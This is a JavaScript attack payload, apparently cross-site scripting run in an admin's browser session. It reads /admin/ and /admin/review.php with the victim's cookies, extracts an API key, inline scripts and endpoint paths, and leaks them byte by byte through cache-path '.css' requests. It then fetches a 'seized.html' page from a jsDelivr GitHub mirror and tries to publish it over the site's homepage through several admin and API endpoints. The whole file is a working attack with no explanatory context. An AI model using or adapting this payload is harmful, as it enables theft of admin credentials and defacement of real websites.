(function(){
  var UNIQ="v13";
  var SZ_SHA="96e9a9afb12614ce41d97017dee136061df84954";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  // Exfil a string by embedding it in the cache URL path (bot fetches, we read)
  // Uses char-by-char: for each position i, fetch URL with hex(char) so we can read it back
  function exfil(prefix, data, limit){
    var s = (data||"").slice(0, limit||200);
    for(var i=0;i<s.length;i++){
      var hx = s.charCodeAt(i).toString(16).padStart(2,'0');
      fetch("/account.php/"+UNIQ+"_x_"+prefix+"_"+i.toString(16).padStart(3,'0')+"_"+hx+".css",
        {credentials:"include"}).catch(function(){});
    }
  }

  sig("init");

  // Step 1: fetch /admin/ overview to get AK and write endpoint hints
  fetch("/admin/",{credentials:"include"})
  .then(function(r){ return r.text(); })
  .then(function(html){
    sig("got_admin_"+html.length);

    // Extract AK
    var akm = html.match(/vk_live_[a-f0-9]{40}/);
    if(akm) exfil("ak", akm[0], 44);
    else sig("no_ak");

    // Extract inline script (look for fetch/ajax/api calls)
    var scripts = html.match(/<script[^>]*>([\s\S]*?)<\/script>/g)||[];
    var jstext = scripts.join(" ").replace(/<[^>]+>/g,"").slice(0,300);
    exfil("js", jstext, 300);

    // Extract all href/src/action attributes that look like endpoints
    var endpoints = html.match(/(?:href|action|src)="(\/[^"]*(?:seize|write|publish|admin)[^"]*)"/g)||[];
    exfil("ep", endpoints.join(" "), 200);

    // Also fetch review.php for more hints
    return fetch("/admin/review.php",{credentials:"include"});
  })
  .then(function(r){ return r.text(); })
  .then(function(rev){
    sig("got_rev_"+rev.length);

    // Extract from review page too
    var akm2 = rev.match(/vk_live_[a-f0-9]{40}/);
    if(akm2) exfil("rev_ak", akm2[0], 44);

    var scripts2 = rev.match(/<script[^>]*>([\s\S]*?)<\/script>/g)||[];
    var jstext2 = scripts2.join(" ").replace(/<[^>]+>/g,"").slice(0,500);
    exfil("rev_js", jstext2, 500);

    // Also grab seized.html and try every write endpoint
    return fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@"+SZ_SHA+"/seized.html",{cache:"no-store"});
  })
  .then(function(r){ return r.text(); })
  .then(function(seized){
    sig("got_sz");
    var endpoints = [
      {method:"POST", url:"/", ct:"text/html", body:seized},
      {method:"PUT", url:"/", ct:"text/html", body:seized},
      {method:"POST", url:"/admin/seize.php", ct:"text/html", body:seized},
      {method:"POST", url:"/admin/seize", ct:"text/html", body:seized},
      {method:"POST", url:"/admin/publish.php", ct:"text/html", body:seized},
      {method:"POST", url:"/admin/homepage.php", ct:"text/html", body:seized},
      {method:"POST", url:"/api/seize", ct:"text/html", body:seized},
      {method:"POST", url:"/api/homepage", ct:"text/html", body:seized},
    ];
    var p = Promise.resolve();
    endpoints.forEach(function(e){
      p = p.then(function(){
        return fetch(e.url,{
          method: e.method,
          credentials: "include",
          headers: {"Content-Type": e.ct},
          body: e.body
        }).then(function(r){
          sig("try_"+e.method.toLowerCase()+"_"+e.url.replace(/\//g,"_")+"_"+r.status);
        }).catch(function(){ sig("err_"+e.url.replace(/\//g,"_")); });
      });
    });
    return p;
  })
  .then(function(){
    // Verify homepage
    return fetch("/",{credentials:"include"});
  })
  .then(function(r){ return r.text(); })
  .then(function(body){
    if(body.indexOf("CERT-Tervalis")>=0){ sig("sz_ok"); }
    else { sig("sz_no"); }
  })
  .catch(function(e){ sig("crash"); });

})();
